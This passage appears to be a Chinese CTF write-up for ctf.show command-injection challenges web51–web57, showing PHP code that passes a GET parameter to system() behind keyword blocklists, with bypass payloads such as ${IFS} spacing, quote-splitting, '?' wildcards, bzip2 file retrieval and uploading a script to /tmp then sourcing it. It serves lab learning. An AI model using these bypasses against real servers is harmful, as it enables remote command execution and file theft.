id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å›æŠŠtacè¿‡æ»¤äº†ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰èƒ½ç”¨çš„ï¼Œæ¯”å¦‚è¯´nl<br><code>?c=nl&lt;&#39;f&#39;lag.php||</code>ï¼Œphpä»£ç éœ€è¦æ‰“å¼€f12æŸ¥çœ‹ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679068035543-96675332-0e1e-4049-a48b-92fc65af02f3.png" alt="image.png"></p><h1 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠé€šé…ç¬¦çš„&lt;&gt;è¿‡æ»¤äº†ï¼Œæ‰¾äº†åŠå¤©è¿˜æœ‰ä»€ä¹ˆåŠæ³•èƒ½å¤Ÿç»•è¿‡ç©ºé¢è¿‡æ»¤ï¼Œçœ‹hintæ‰å‘ç°åˆå¯ä»¥ä½¿ç”¨$äº†â€¦<br><code>?c=nl$&#123;IFS&#125;fla&#39;&#39;g.php||</code></p><h1 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        echo($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        echo <span class="string">&quot;&lt;br&gt;&quot;</span>.$d;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        echo <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=nl$&#123;IFS&#125;fla&#39;&#39;g.php</code>ä½†å®é™…ä¸Šå‰é¢è¿‡æ»¤çš„å­—ç¬¦ä¹Ÿå¯ä»¥é€šè¿‡å•å¼•å·å¼•ç”¨ç»•è¿‡è¿‡æ»¤ï¼Œæ¯”å¦‚hintä¸­çš„payloadå¦‚ä¸‹ï¼š<code>c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679585398882-ec3be4e8-ae77-465f-a040-def087976b2b.png" alt="image.png"></p><h1 id="web54-é€šé…ç¬¦ä¸­é—®å·çš„ä½¿ç”¨"><a href="#web54-é€šé…ç¬¦ä¸­é—®å·çš„ä½¿ç”¨" class="headerlink" title="web54 é€šé…ç¬¦ä¸­é—®å·çš„ä½¿ç”¨"></a>web54 é€šé…ç¬¦ä¸­é—®å·çš„ä½¿ç”¨</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ç§æ–¹æ³•ï¼š<code>mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</code>ï¼Œå› ä¸ºæ²¡æœ‰ç¦ç”¨lsï¼Œå› æ­¤çŸ¥é“æ–‡ä»¶åï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨mvæ¥é‡å‘½åæ–‡ä»¶ã€‚ç„¶åæ‰“å¼€å³å¯ï¼Œæ‰“å¼€æœ‰å‡ ç§ä¸åŒçš„æ–¹æ³•ï¼Œæ¯”å¦‚è¯´<code>?c=uniq$&#123;IFS&#125;a.txt</code>ï¼Œä½†æ˜¯flagåœ¨æºä»£ç ä¸­ï¼Œéœ€è¦f12æŸ¥çœ‹ï¼›æˆ–è€…ç”¨<code>?c=rev$&#123;IFS&#125;a.txt</code>åè½¬è¾“å‡ºæ–‡ä»¶ï¼Œè¿™ç§å¾—åˆ°çš„flagæ˜¯è¡Œåè½¬çš„ï¼Œéœ€è¦è°ƒè½¬å›æ¥ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679587103373-ae7c080f-73d5-4fb5-b617-0b10124e9840.png" alt="image.png"><br>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ç§ç›´æ¥ä¸€æ­¥å®Œæˆçš„æ–¹æ³•ã€‚<code>c=uniq$&#123;IFS&#125;f???.php</code>ï¼Œè¿™é‡Œé€šè¿‡ä½¿ç”¨ï¼Ÿé€šé…ç¬¦æ¥ä¸€æ­¥ç»•è¿‡è¿‡æ»¤ï¼Œå…¶å®å¯¹åç§°çš„è¿‡æ»¤å¤§éƒ¨åˆ†å°±æ˜¯å¯¹linuxé€šé…ç¬¦çš„è€ƒå¯Ÿï¼Œéœ€è¦æˆ‘ä»¬ä¸€ç‚¹ç‚¹åŠ å¼ºåŠŸåº•ã€‚</p><h2 id="é€šé…ç¬¦ï¼Ÿå’Œ-çš„åŒºåˆ«"><a href="#é€šé…ç¬¦ï¼Ÿå’Œ-çš„åŒºåˆ«" class="headerlink" title="é€šé…ç¬¦ï¼Ÿå’Œ*çš„åŒºåˆ«"></a>é€šé…ç¬¦ï¼Ÿå’Œ*çš„åŒºåˆ«</h2><p>*å¯ä»¥æ›¿ä»£ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ï¼Œè€Œï¼Ÿåªèƒ½æ›¿ä»£ä¸€ä¸ªå­—ç¬¦ã€‚<br>æ¯”å¦‚ï¼š</p><ul><li>å¦‚æœæ­£åœ¨æŸ¥æ‰¾ä»¥AEWå¼€å¤´çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†ä¸è®°å¾—æ–‡ä»¶åå…¶ä½™éƒ¨åˆ†ï¼Œå¯ä»¥è¾“å…¥AEW*ï¼ŒæŸ¥æ‰¾ä»¥AEWå¼€å¤´çš„æ‰€æœ‰æ–‡ä»¶ç±»å‹çš„æ–‡ä»¶ï¼Œå¦‚AEWT.txtã€AEWU.EXEã€AEWI.dllç­‰ã€‚</li><li>å¦‚æœè¾“å…¥love?ï¼ŒæŸ¥æ‰¾ä»¥loveå¼€å¤´çš„ä¸€ä¸ªå­—ç¬¦ç»“å°¾æ–‡ä»¶ç±»å‹çš„æ–‡ä»¶ï¼Œå¦‚loveyã€loveiç­‰ã€‚è¦ç¼©å°èŒƒå›´å¯ä»¥è¾“å…¥love?.docï¼ŒæŸ¥æ‰¾ä»¥loveå¼€å¤´çš„ä¸€ä¸ªå­—ç¬¦ç»“å°¾æ–‡ä»¶ç±»å‹å¹¶.docä¸ºæ‰©å±•åçš„æ–‡ä»¶å¦‚lovey.docã€loveh.docã€‚</li></ul><h1 id="web55-é€šé…ç¬¦ä¸­é—®å·ä½¿ç”¨plusç‰ˆ"><a href="#web55-é€šé…ç¬¦ä¸­é—®å·ä½¿ç”¨plusç‰ˆ" class="headerlink" title="web55 é€šé…ç¬¦ä¸­é—®å·ä½¿ç”¨plusç‰ˆ"></a>web55 é€šé…ç¬¦ä¸­é—®å·ä½¿ç”¨plusç‰ˆ</h1><blockquote><p><a href="https://blog.csdn.net/xiaolong22333/article/details/109480420?spm=a2c6h.12873639.article-detail.4.6ced5331lGc8cc">https://blog.csdn.net/xiaolong22333/article/details/109480420?spm=a2c6h.12873639.article-detail.4.6ced5331lGc8cc</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆšçœ‹åˆ°è¿™ä¸ªé¢˜çš„ç¬¬ä¸€æƒ³æ³•æ˜¯ä½¿ç”¨è‡ªå¢ï¼Œä½†æ˜¯å‘ç°å§åˆ†å·è¿‡æ»¤äº†ï¼Œç”¨ä¸äº†ã€‚çœ‹äº†ä¸€ä¸‹wpï¼Œå‘ç°äº†å‡ ç§æ¯”è¾ƒç‰›é€¼çš„è§£æ³•ã€‚</p><h2 id="æ–¹æ³•ä¸€-ä½¿ç”¨binç›®å½•ä¸‹çš„base64å‘½ä»¤-æ¥ä»£æ›¿å­—ç¬¦"><a href="#æ–¹æ³•ä¸€-ä½¿ç”¨binç›®å½•ä¸‹çš„base64å‘½ä»¤-æ¥ä»£æ›¿å­—ç¬¦" class="headerlink" title="æ–¹æ³•ä¸€ ä½¿ç”¨binç›®å½•ä¸‹çš„base64å‘½ä»¤ ?æ¥ä»£æ›¿å­—ç¬¦"></a>æ–¹æ³•ä¸€ ä½¿ç”¨binç›®å½•ä¸‹çš„base64å‘½ä»¤ ?æ¥ä»£æ›¿å­—ç¬¦</h2><p>è¿™é‡Œæƒ³ä½¿ç”¨çš„çŸ¥è¯†ç‚¹æ˜¯ï¼š<code>/bin/base64 flag.php</code><br>å…ˆä»‹ç»ä¸€ä¸‹ï¼Œåœ¨/binç›®å½•ä¸‹æœ‰è‹¥å¹²ä¸ªå‘½ä»¤å¯ä»¥ä½¿ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarã€base64ç­‰</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œè¿‡æ»¤äº†å­—ç¬¦ï¼Œä¸èƒ½ç›´æ¥ç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å€ŸåŠ©é€šé…ç¬¦ä¸­çš„é—®å·æ¥å®Œæˆpayloadã€‚<br>å³<code>/???/????64</code>å› ä¸ºæ²¡æœ‰è¿‡æ»¤æ‰æ•°å­—ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡64æ¥æ‰¾åˆ°base64å‘½ä»¤ã€‚å½“ç„¶ï¼Œæ–‡ä»¶åä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨ï¼Ÿè¡¨ç¤ºçš„ã€‚<br>payloadï¼š<code>/???/????64 ????.???</code>åé¢è¿™ä¸²ä»£è¡¨çš„<code>flag.php</code>ã€‚å°†å¾—åˆ°çš„å­—ç¬¦ä¸²base64è§£å¯†å³å¯ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679811886497-dc470501-ef71-466c-b5cf-70e724650d0a.png" alt="image.png"><br>ä½†æ˜¯å¦‚ä½•çŸ¥é“æ–‡ä»¶åæ˜¯<code>flag.php</code>çš„è¿™é‡Œå¹¶æ²¡æœ‰æåˆ°ã€‚</p><h2 id="æ–¹æ³•äºŒ-ä½¿ç”¨bzip2ä¸‹è½½æ–‡ä»¶-ï¼Ÿæ¥ä»£æ›¿å­—ç¬¦"><a href="#æ–¹æ³•äºŒ-ä½¿ç”¨bzip2ä¸‹è½½æ–‡ä»¶-ï¼Ÿæ¥ä»£æ›¿å­—ç¬¦" class="headerlink" title="æ–¹æ³•äºŒ ä½¿ç”¨bzip2ä¸‹è½½æ–‡ä»¶ ï¼Ÿæ¥ä»£æ›¿å­—ç¬¦"></a>æ–¹æ³•äºŒ ä½¿ç”¨bzip2ä¸‹è½½æ–‡ä»¶ ï¼Ÿæ¥ä»£æ›¿å­—ç¬¦</h2><p>é™¤äº†<code>/bin</code>åœ°å€ä¸‹ï¼Œ<code>/usr/bin</code>ä¸‹ä¹Ÿæœ‰æ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c++ã€g++ã€gccã€chdrvã€diffã€digã€duã€ejectã€elmã€freeã€gnomeã€ zipã€htpasswdã€kfmã€ktopã€lastã€lessã€localeã€m4ã€makeã€manã€mcopyã€ncftpã€ newaliasesã€nslookup passwdã€quotaã€smbã€wgetç­‰</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åƒæ–¹æ³•ä¸€ä¸­é€‰æ‹©å…·æœ‰æ•°å­—çš„æ–¹æ³•æ¥ä½¿ç”¨ï¼Œæ¯”å¦‚ï¼š<br><code>/usr/bin/bzip2 flag.php</code><br>ä¿®æ”¹ä¸ºpayloadï¼š<code>/???/???/????2 ????.???</code>ï¼Œå‹ç¼©ä¹‹åï¼ŒæŸ¥è¯¢å‘ç°bzip2æ–¹æ³•å‹ç¼©çš„æ–‡ä»¶åç§°åç¼€ä¸º<code>.bz2</code><br>å› æ­¤æˆ‘ä»¬è®¿é—®æ–‡ä»¶ä¸‹è½½å³å¯<code>/flag.php.bz2</code>ï¼Œåœ¨æœ¬åœ°è§£å‹æ‰“å¼€å³å¯ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679813512843-4296f544-86a6-4c74-a04e-ebd399b198ef.png" alt="image.png"></p><h2 id="æ–¹æ³•ä¸‰-â€œ-â€çš„å¦™ç”¨"><a href="#æ–¹æ³•ä¸‰-â€œ-â€çš„å¦™ç”¨" class="headerlink" title="æ–¹æ³•ä¸‰ â€œ.â€çš„å¦™ç”¨"></a>æ–¹æ³•ä¸‰ â€œ.â€çš„å¦™ç”¨</h2><blockquote><p><a href="https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html">https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html</a></p></blockquote><p>sourceå‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯.å‘½ä»¤ï¼Œå¯ä»¥é€šè¿‡<code>. file</code>æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå› æ­¤è¿™é¢˜æˆ‘ä»¬å¯ä»¥é€šè¿‡postä¸Šä¼ æ–‡ä»¶æ¥æ‰§è¡Œå‘½ä»¤ã€‚<br>å½“æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ä¹‹åï¼Œæ–‡ä»¶ä¼šè¢«ä¿å­˜åœ¨<code>/tmp</code>ä¸‹ï¼Œæ–‡ä»¶åç§°ä¸ºéšæœºæ„æˆçš„å…­ä¸ªå­—ç¬¦ã€‚å› æ­¤å¯ä»¥ä½¿ç”¨<code>/???/??????</code>æ¥åŒ¹é…æ–‡ä»¶ï¼Œä½†æ˜¯ä¸´æ—¶æ–‡ä»¶æœ‰å¾ˆå¤šï¼Œè¿™æ ·æ²¡æœ‰åŠæ³•ç²¾å‡†åœ°æ‰¾åˆ°éœ€è¦çš„æ–‡ä»¶ã€‚<br>è¿™ç¯‡æ–‡ç« ç»™å‡ºäº†è§£å†³æ–¹æ¡ˆï¼š</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p></blockquote><p>åœ¨tmpä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œåªæœ‰phpç”Ÿæˆçš„æ–‡ä»¶æ˜¯åŒ…å«å¤§å†™å­—æ¯çš„ï¼Œå…¶ä½™éƒ½æ˜¯å°å†™å­—æ¯ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åŠ ä¸€ä¸ªè¿‡æ»¤å¤§å†™å­—æ¯çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œä½†æ˜¯ç”±äºä¸ä¸€å®šä¸€å®šä¼šç”Ÿæˆå¤§å†™å­—æ¯ï¼Œå› æ­¤éœ€è¦å¤šæ¬¡å°è¯•ã€‚<br>è¿‡æ»¤å‡ºå¤§å†™å­—æ¯æ­£å¸¸æ¥è¯´åº”è¯¥æŒ‰ç…§å¦‚ä¸‹æ¥å†™ï¼š<code>/???/????????[A-Z]</code>ï¼Œä½†æ˜¯è¿™é¢˜é‡Œé¢è¿‡æ»¤æ‰äº†å­—ç¬¦ï¼Œå› æ­¤åªèƒ½ç”¨Aå‰é¢çš„å­—ç¬¦å’ŒZåé¢çš„å­—ç¬¦ï¼ˆASCIIè¡¨ï¼‰ï¼Œä¹Ÿå°±æ˜¯ï¼š<code>/???/????????[@-[]</code>ã€‚<br>æˆ‘ä»¬åº”è¯¥å¦‚ä½•ä¸Šä¼ æ–‡ä»¶å‘¢ã€‚<br>æ¯”è¾ƒå¤æ‚çš„åŠæ³•å°±æ˜¯è‡ªå·±æ„é€ postå†…å®¹å†™ï¼Œæ¯”è¾ƒç®€å•çš„å°±æ˜¯å€ŸåŠ©å·¥å…·ã€‚<br>åœ¨æœ¬åœ°å†™ä¸€ä¸ªç®€å•çš„htmlæ–‡ä»¶ï¼ˆå°†åœ°å€ä¿®æ”¹ä¸ºç›®æ ‡åœ°å€ï¼‰</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POSTæ•°æ®åŒ…POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://d3b49897-da81-47f9-8495-e017b7cf25e7.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>æ–‡ä»¶åï¼š<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æœ¬åœ°è¿è¡Œæ–‡ä»¶ï¼Œç„¶åä¸Šä¼ å³å¯ã€‚<br>ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cat flag.php</span><br></pre></td></tr></table></figure><p>æ³¨æ„é€”ä¸­è¦æŠ“åŒ…ï¼Œè¿™æ ·æ‰æ›´æ–¹ä¾¿ä¿®æ”¹ã€‚<br>ä¿®æ”¹getä¼ å‚<code>/?c=. /???/????????[@-[]</code>ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä¿®æ”¹æ–‡ä»¶å†…å®¹æ¥lsä¸€ä¸‹æŸ¥çœ‹æ–‡ä»¶ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679817166939-6c78d5c4-63c2-4473-9416-6b24f0bff2bc.png" alt="image.png"><br>catè®¿é—®æ–‡ä»¶ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679817244688-04f1315d-5f3a-4305-a1fc-68a7850e8dc0.png" alt="image.png"><br>æ³¨æ„ï¼Œæœ‰çš„æ—¶å€™æ²¡æœ‰å›æ˜¾æ˜¯å› ä¸ºæ–‡ä»¶æœ«å°¾å¹¶ä¸æ˜¯å¤§å†™å­—æ¯ï¼Œéœ€è¦å¤šå°è¯•ä¸¤éã€‚</p><h1 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒç†ï¼Œä½¿ç”¨ä¸Šä¸€é¢˜ç¬¬ä¸‰ç§æ–¹æ³•ä¸Šä¼ æ–‡ä»¶å³å¯ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680162642108-4d1c4acd-baaa-40e9-9e8d-669a726c41d8.png" alt="image.png"></p><h1 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h1><blockquote><p><a href="https://blog.csdn.net/qq_46091464/article/details/108563368">https://blog.csdn.net/qq_46091464/article/details/108563368</a><br><a href="https://blog.csdn.net/weixin_45551083/article/details/110096787">https://blog.csdn.net/weixin_45551083/article/details/110096787</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ 